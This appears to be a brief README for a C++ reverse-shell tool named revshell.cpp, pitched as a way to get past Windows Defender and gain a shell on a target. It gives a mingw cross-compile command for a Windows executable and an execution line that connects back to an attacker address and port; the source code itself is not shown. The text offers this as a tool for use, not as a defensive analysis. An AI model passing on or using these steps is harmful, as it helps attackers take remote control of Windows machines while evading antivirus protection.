## revshell.cpp
Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target.
*Note: With revshell2 you can specify IP and PORT destination as arguments*

- Compile in linux with: `x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++`
- Execute: `rev.exe 192.168.45.195 9001`
